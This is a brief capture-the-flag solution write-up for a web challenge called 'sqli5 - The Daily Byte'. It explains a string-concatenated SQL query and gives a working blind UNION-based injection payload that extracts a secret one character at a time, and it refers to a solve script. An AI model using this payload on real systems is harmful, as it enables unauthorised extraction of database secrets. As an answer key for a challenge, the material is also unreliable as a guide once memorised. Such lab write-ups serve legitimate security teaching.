# sqli5 - The Daily Byte: intended solution

The tag filter in `app/app.py` builds its query by concatenation:

    SELECT id, title, tag, posted FROM posts WHERE tag='<t>'

The page renders exactly the returned rows - no counts, no errors - so the
oracle is a marker row. With:

    zzz' UNION SELECT 1, '>>MARKER<<', 3, 4
        WHERE (SELECT substr(secret,N,1) FROM vault LIMIT 1) = '<c>' --

the (empty) tag lookup is unioned with one constant row whose title is
`>>MARKER<<`, and the row survives only when the Nth character of the
vault secret equals `<c>`. Nothing is tagged "zzz...", so the marker is
visible exactly for the correct character. Scanning `<c>` per position
reconstructs the secret (the flag).

## Reference exploit

    python solve.py [http://host:8034]
